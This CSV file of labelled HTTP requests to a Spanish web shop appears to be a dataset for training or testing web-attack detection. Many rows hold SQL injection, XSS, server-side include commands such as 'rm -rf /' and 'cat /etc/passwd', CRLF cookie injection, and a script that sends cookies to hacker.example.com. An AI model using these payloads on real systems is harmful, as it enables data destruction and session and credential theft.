request,classification
/tienda1/miembros/editar.jsp /modo=registro&loginA=doerr&password=8osqu85a7&nombre=Remy&apellidos=Torrado+G%E1llego&email=akadeth_svojtka%40privatebanking.com.pe&dni=98300353D&direccion=Calle+Equador+86%2C+&ciudad=Sant+Cugat+Sesgarrigues&cp=17001&provincia=Burgos&ntc=9853640605253421&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico%27OR%27a%3D%27a&precio=100&cantidad=92&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombre=Vino+.*%3FRioja&precio=100&cantidad=92&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=92&B1A=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=adebayo&pwd=pedral&remember=+&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=adebayo&pwd=pedral&remember=off%2F&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=adebayo&pwd=pedral&remember=off&B1A=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5781&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar%27+DELETE+FROM+USERS&precio=5781&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5781&B1=Pasar+por+caja%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5781&B1A=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=junkie&password=5arin3-ro&nombre=Sol&apellidos=Ferrada+Montull&email=macnee-voringer%40b-sign.sb&dni=61302831B&direccion=C%2F+Timoteo+Martin%2C+24+7%3FG%2520&ciudad=Quintanilla+de+Arriba&cp=49639&provincia=Barcelona&ntc=6741458111555390&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=junkie&password=5arin3-ro&nombre=%253F&apellidos=Ferrada+Montull&email=macnee-voringer%40b-sign.sb&dni=61302831B&direccion=C%2F+Timoteo+Martin%2C+24+7%3FG&ciudad=Quintanilla+de+Arriba&cp=49639&provincia=Barcelona&ntc=6741458111555390&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=junkie&password=5arin3-ro&nombre=Sol&apellidos=Ferrada+Montull&email=macnee-voringer%40b-sign.sb&dni=61302831B&direccion=C%2F+Timoteo+Martin%2C+24+7%3FG&ciudad=Quintanilla+de+Arriba&cp=3771A&provincia=Barcelona&ntc=6741458111555390&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=junkie&password=5arin3-ro&nombreA=Sol&apellidos=Ferrada+Montull&email=macnee-voringer%40b-sign.sb&dni=61302831B&direccion=C%2F+Timoteo+Martin%2C+24+7%3FG&ciudad=Quintanilla+de+Arriba&cp=49639&provincia=Barcelona&ntc=6741458111555390&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%252B,1
/tienda1/publico/vaciar.jsp /B2=%27OR%27a%3D%27a,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=gawargy&password=esquem%E1tic%27a&nombre=Di%F3genes&apellidos=Marchal+Bos&email=lorch8%40classroommanager.lv&dni=98648319P&direccion=Plza.+Compas+De+La+Trinidad%2C+80+&ciudad=Garganta+la+Olla&cp=34846&provincia=Castell%F3n&ntc=0242598973477682&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=gawargy&password=3nd9mes17*61da&nombre=Di%F3genes&apellidos=Marchal+Bos&email=lorch8%40classroommanager.lv&dni=98648319P&direccion=Plza.+Compas+De+La+Trinidad%2C+80+&ciudad=Garganta+la+Olla&cpA=34846&provincia=Castell%F3n&ntc=0242598973477682&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico&precioA=100&cantidad=41&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=je%3Fssam%3Fyn&pwd=1%DAg9BR1me38E&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=2,1
/tienda1/publico/caracteristicas.jsp /id=%27INJECTED_PARAM,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectasany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5029&B1=%4040,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5029&B1=Pasar+por+caja%2F,1
/tienda1/publico/pagar.jsp /modoA=insertar&precio=5029&B1=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=tac&password=e486ac0%F34&nombre=Atal%EDvar&apellidos=Blaya&email=ryle%40professionalhosting.com.cv&dni=25454571B&direccion=Calle+Pastor+De+Iberia+S%2FN%2C+2E&ciudad=Vilanova+de+la+Barca%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=22415&provincia=Palencia&ntc=0517144420469351&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=e486ac0%F34&nombre=Atal%EDvar&apellidos=Blaya&email=ryle%40professionalhosting.com.cv&dni=25454571B&direccion=Calle+Pastor+De+Iberia+S%2FN%2C+2E&ciudad=Vilanova+de+la+Barca&cp=22415&provincia=Palencia&ntc=0517144420469351&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=tac&password=e486ac0%F34&nombre=Atal%EDvar&apellidos=Blaya&email=ryle%40professionalhosting.com.cv&dni=25454571B&direccion=Calle+Pastor+De+Iberia+S%2FN%2C+2E&ciudad=Vilanova+de+la+Barca&cp=2228A&provincia=Palencia&ntc=0517144420469351&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=tac&password=e486ac0%F34&nombre=Atal%EDvar&apellidos=Blaya&email=ryle%40professionalhosting.com.cv&dni=25454571B&direccion=Calle+Pastor+De+Iberia+S%2FN%2C+2E&ciudad=Vilanova+de+la+Barca&cp=22415&provincia=Palencia&ntc=0517144420469351&B1A=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%7C,1
/tienda1/publico/vaciar.jsp /B2=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,1
/tienda1/miembros/editar.jsp /modo=registro&login=kathlin&password=%2Blaur938&nombre=Rasmira&apellidos=Pubill+Tena&email=strasberg-gales%40videocasa-ebs.gi&dni=%27OR%27a%3D%27a&direccion=Isla+De+Salvora%2C+65+1%3FC&ciudad=Larraona&cp=40542&provincia=Guip%FAzcoa&ntc=6860803220087599&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=kathlin&password=%2Blaur938&nombre=Jorda%3Fna&apellidos=Pubill+Tena&email=strasberg-gales%40videocasa-ebs.gi&dni=75987637F&direccion=Isla+De+Salvora%2C+65+1%3FC&ciudad=Larraona&cp=40542&provincia=Guip%FAzcoa&ntc=6860803220087599&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=kathlin&password=%2Blaur938&nombre=Rasmira&apellidosA=Pubill+Tena&email=strasberg-gales%40videocasa-ebs.gi&dni=75987637F&direccion=Isla+De+Salvora%2C+65+1%3FC&ciudad=Larraona&cp=40542&provincia=Guip%FAzcoa&ntc=6860803220087599&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=2&nombre=Ques%2Bo+Manchego&precio=100&cantidad=80&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /idA=2&nombre=Vino+Rioja&precio=100&cantidad=80&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=heleen%252B&pwd=castella8ismo&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=heleen&pwd=gEnIa%27lMEntE&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=heleen&pwd=castella8ismo&remember=on&B1A=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=2,1
/tienda1/publico/caracteristicas.jsp /id=%2B,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectasAND+1%3D1,1
/tienda1/publico/entrar.jsp /errorMsg=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=%2520&B1=Confirmar,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=7767&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precioA=7767&B1=Confirmar,1
/tienda1/publico/registro.jsp /modo=registro&login=jamilahbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&password=e0f2n87a&nombre=Virma&apellidos=Duch+Vilarnau&email=rosamond_aloyshina%40videospornocaseros.aq&dni=84711932B&direccion=Alfredo+Donay+178%2C+&ciudad=Casas+del+Monte&cp=17650&provincia=Toledo&ntc=7712379186246495&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=jamilah&password=%7C&nombre=Virma&apellidos=Duch+Vilarnau&email=rosamond_aloyshina%40videospornocaseros.aq&dni=84711932B&direccion=Alfredo+Donay+178%2C+&ciudad=Casas+del+Monte&cp=17650&provincia=Toledo&ntc=7712379186246495&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=jamilah&password=e0f2n87a&nombre=Virma&apellidos=Duch+Vilarnau&email=rosamond_aloyshina%40videospornocaseros.aq&dni=84711932B&direccion=Alfredo+Donay+178%2C+&ciudad=Casas+del+Monte&cp=17650&provincia=Za.%2Fragoza&ntc=7712379186246495&B1=Registrar,1
/tienda1/publico/registro.jsp /modoA=registro&login=jamilah&password=e0f2n87a&nombre=Virma&apellidos=Duch+Vilarnau&email=rosamond_aloyshina%40videospornocaseros.aq&dni=84711932B&direccion=Alfredo+Donay+178%2C+&ciudad=Casas+del+Monte&cp=17650&provincia=Toledo&ntc=7712379186246495&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,1
/tienda1/publico/vaciar.jsp /B2=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=grainger&password=dilecci%F3n&nombre=Generosa&apellidos=Rodamila&email=nazimova%40ibizasounds.sh&dni=47610956J&direccion=C%2F+Selva%2C+14%2C+5%3FF&ciudad=Farrera&cp=18290&provincia=Madrid&ntc=8021682596257423&B1=Registrar%27OR%27a%3D%27a,1
/tienda1/miembros/editar.jsp /modo=registro&login=grainger&password=dilecci%F3n&nombre=%3FBa%27bel-i&apellidos=Rodamila&email=nazimova%40ibizasounds.sh&dni=47610956J&direccion=C%2F+Selva%2C+14%2C+5%3FF&ciudad=Farrera&cp=18290&provincia=Madrid&ntc=8021682596257423&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=grainger&password=dilecci%F3n&nombre=Generosa&apellidos=Rodamila&email=nazimova%40ibizasounds.sh&dni=47610956J&direccion=C%2F+Selva%2C+14%2C+5%3FF&ciudad=Farrera&cpA=18290&provincia=Madrid&ntc=8021682596257423&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=3&nombre=Vino+Rioja&precio=100&cantidad=70&B1=A%F1adir+al+carrito%2520,1
/tienda1/publico/anadir.jsp /id=3&nombre=Vino+.*%3FRioja&precio=100&cantidad=70&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /idA=3&nombre=Vino+Rioja&precio=100&cantidad=70&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrarSet-cookie%253A%2BTamper%253D1041264011025374727&login=kuchinsk&pwd=rogadora&remember=off&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=kuchinsk&pwd=rogadora&remember=off&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=kuchinsk&pwd=b*58TO76A%27%2Cna&remember=off&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=kuchinsk&pwd=rogadora&remember=off&B1A=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=%7C,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=%2520,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=622%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=622&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=622&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precioA=622&B1=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=sainsbur&password=aUsTridA%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&nombre=Deifilia&apellidos=Benedetti+Lozana&email=haddrick_cleary%40esposa.com.mobi&dni=80061275T&direccion=Plza.+Garcia+Alvarez+De+Albornoz%2C+146+&ciudad=Alc%E1zares%2C+Los&cp=41540&provincia=Tarragona&ntc=0932460116452279&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=sainsbur&password=aUsTridA&nombre=Deifilia&apellidos=Benedetti+Lozana&email=haddrick_cleary%40esposa.com.mobi&dni=80061275T&direccion=Plza.+Garcia+Alvarez+De+Albornoz%2C+146+&ciudad=Alc%E1zares%2C+Los&cp=3432A&provincia=Tarragona&ntc=0932460116452279&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&loginA=sainsbur&password=aUsTridA&nombre=Deifilia&apellidos=Benedetti+Lozana&email=haddrick_cleary%40esposa.com.mobi&dni=80061275T&direccion=Plza.+Garcia+Alvarez+De+Albornoz%2C+146+&ciudad=Alc%E1zares%2C+Los&cp=41540&provincia=Tarragona&ntc=0932460116452279&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=%3F,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=dawn8&password=0H8bUQu%CD&nombre=Quinciano&apellidos=Manzanera+Agudo&email=cervi%40zingtonos.mv&dni=11051114M&direccion=C%2F+Poceros%2C+29%2C+&ciudad=Anna&cp=37797&provincia=Ourense&ntc=5688192527960477&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=dawn8&password=0H8bUQu%CD&nombre=Quinciano&apellidos=Manzanera+Agudo&email=%27+DELETE+FROM+USERS&dni=11051114M&direccion=C%2F+Poceros%2C+29%2C+&ciudad=Anna&cp=37797&provincia=Ourense&ntc=5688192527960477&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=dawn8&password=0H8bUQu%CD&nombre=Quinciano&apellidos=Manzanera+Agudo&email=landoul%40si.nilpet%40ci%40tycvs.ro&dni=11051114M&direccion=C%2F+Poceros%2C+29%2C+&ciudad=Anna&cp=37797&provincia=Ourense&ntc=5688192527960477&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=dawn8&passwordA=0H8bUQu%CD&nombre=Quinciano&apellidos=Manzanera+Agudo&email=cervi%40zingtonos.mv&dni=11051114M&direccion=C%2F+Poceros%2C+29%2C+&ciudad=Anna&cp=37797&provincia=Ourense&ntc=5688192527960477&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=3&nombre=Queso+Manchego&precio=39&cantidad=%2520&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=1%2F&nombre=Queso+Manchego&precio=39&cantidad=24&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /idA=3&nombre=Queso+Manchego&precio=39&cantidad=24&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=rizzardi&pwd=332G3le8a&remember=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=rizzardi&pwd=%2C9%2Foc7c4%F3%2C0&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modoA=entrar&login=rizzardi&pwd=332G3le8a&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=2%27OR%27a%3D%27a,1
/tienda1/publico/caracteristicas.jsp /id=AND+1%3D1,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectasparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&precio=1700&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1700&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1700&B1A=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=legolas&password=Z5R872Car5E&nombre=Helvecia&apellidos=Fuensalida+Liuzzi&email=stoichkov%40spainpharma.st&dni=70101170E&direccion=Calle+Comte+De+Barcelona+140%2C+&ciudad=Barracas&cp=17857&provincia=Palenciaany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&ntc=6931646496457653&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=legolas&password=Z5R872Car5E&nombre=Helvecia&apellidos=Fuensalida+Liuzzi&email=stoichkov%40spainpharma.st&dni=70101170E&direccion=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&ciudad=Barracas&cp=17857&provincia=Palencia&ntc=6931646496457653&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=legolas&password=Z5R872Car5E&nombre=Helvecia&apellidos=Fuensalida+Liuzzi&email=stoichkov%40spainpharma.st&dni=612%27947AD&direccion=Calle+Comte+De+Barcelona+140%2C+&ciudad=Barracas&cp=17857&provincia=Palencia&ntc=6931646496457653&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=legolas&password=Z5R872Car5E&nombre=Helvecia&apellidos=Fuensalida+Liuzzi&email=stoichkov%40spainpharma.st&dniA=70101170E&direccion=Calle+Comte+De+Barcelona+140%2C+&ciudad=Barracas&cp=17857&provincia=Palencia&ntc=6931646496457653&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%22+AND+%221%22%3D%221,1
/tienda1/publico/vaciar.jsp /B2=%2500,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=gerhardt8&password=pizmie%2Bnta&nombre=Yamila&apellidos=Cardalliaguet+Yescas&email=armantel%40laspruebascongaseosa.vg&dni=65724136A&direccion=Castro+Canseco+8+5%3FH&ciudad=Oria&cp=17538&provincia=Albacete&ntc=2877016523183053&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=gerhardt8&password=pizmie%2Bnta&nombre=Yamila&apellidos=Cardalliaguet+Yescas&email=armantel%40laspruebascongaseosa.vg&dni=65724136A&direccion=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&ciudad=Oria&cp=17538&provincia=Albacete&ntc=2877016523183053&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=gerhardt8&password=pizmie%2Bnta&nombre=Yamila&apellidos=Cardalliaguet+Yescas&email=armantel%40laspruebascongaseosa.vg&dni=65724136A&direccion=Castro+Canseco+8+5%3FH&ciudad=Oria&cp=4351A&provincia=Albacete&ntc=2877016523183053&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=gerhardt8&password=pizmie%2Bnta&nombre=Yamila&apellidos=Cardalliaguet+Yescas&email=armantel%40laspruebascongaseosa.vg&dni=65724136A&direccionA=Castro+Canseco+8+5%3FH&ciudad=Oria&cp=17538&provincia=Albacete&ntc=2877016523183053&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=74&B1A=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=melisse&pwd=pleit%E9s&remember=onAND+1%3D1&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=*goodm%3F%3Fan&pwd=pleit%E9s&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=melisse&pwd=pleit%E9s&remember=on&B1A=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=1%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5906&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5906&B1A=Confirmar,1
/tienda1/publico/registro.jsp /modo=registro&login=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&password=3749s63a&nombre=Avito&apellidos=Zalarich+Llufriu&email=saul%40expertmagnet.np&dni=14335839P&direccion=C%2F+Barranquet+130+&ciudad=Calzada+de+los+Molinos&cp=50470&provincia=A+Coru%F1a&ntc=9270239658811052&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=s%2Fhakor&password=3749s63a&nombre=Avito&apellidos=Zalarich+Llufriu&email=saul%40expertmagnet.np&dni=14335839P&direccion=C%2F+Barranquet+130+&ciudad=Calzada+de+los+Molinos&cp=50470&provincia=A+Coru%F1a&ntc=9270239658811052&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=kozsukan&password=3749s63a&nombre=Avito&apellidos=Zalarich+Llufriu&emailA=saul%40expertmagnet.np&dni=14335839P&direccion=C%2F+Barranquet+130+&ciudad=Calzada+de+los+Molinos&cp=50470&provincia=A+Coru%F1a&ntc=9270239658811052&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=gofron&password=emenda&nombre=Ranger&apellidos=Jalmar+Arambide&email=avdjusko.polivitskiui%40javilasan.kr&dni=364419A4P&direccion=C%2F+Huerta+El+Palomar%2C+S%2FN%2C+&ciudad=Moral+de+la+Reina&cp=26321&provincia=Navarra&ntc=8906753589581639&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=gofron&password=emenda&nombre=Ranger&apellidos=Jalmar+Arambide&emailA=avdjusko.polivitskiui%40javilasan.kr&dni=43344488E&direccion=C%2F+Huerta+El+Palomar%2C+S%2FN%2C+&ciudad=Moral+de+la+Reina&cp=26321&provincia=Navarra&ntc=8906753589581639&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=1&nombre=Queso+Manchego&precio=85&cantidad=76&B1=A%F1adir+al+carrito%7C,1
/tienda1/publico/anadir.jsp /id=1&nombre=Queso+Manchego&precio=100%2F&cantidad=76&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=1&nombre=Queso+Manchego&precioA=85&cantidad=76&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=hisko&pwd=misionerasessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&remember=off&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=hisko&pwd=misionera&remember=off&B1=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=hisko&pwd=alberc8%27q4%2Cero&remember=off&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=hisko&pwd=misionera&remember=off&B1A=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=3076sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Confirmar,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=3076&B1=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=3076&B1=Pasar+por+caja%2F,1
/tienda1/publico/registro.jsp /modo=registro&login=hainline4&password=M9a&nombre=Dayan&apellidos=Aldeta+Marnetti&email=chanel_ismael%40conac.com.ie&dni=98027307L&direccion=C%2F+Abeja%2C+S%2FN+&ciudad=Navalacruz&cp=24740&provinciaA=Segovia&ntc=1385468393912662&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carritosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=vania&password=d%21eSBARATaDA&nombre=Romario&apellidos=%4040&email=henig%40lauracuadrado.ic&dni=77483786Y&direccion=Lugar+Outeiro+124+11-D&ciudad=Torm%F3n&cp=15500&provincia=Navarra&ntc=9707398438583110&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=%257C&nombre=Vino+Rioja&precio=100&cantidad=34&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=1&nombre=Vino+Rioja&precio=100&cantidadA=34&B1=A%F1adir+al+carrito,1
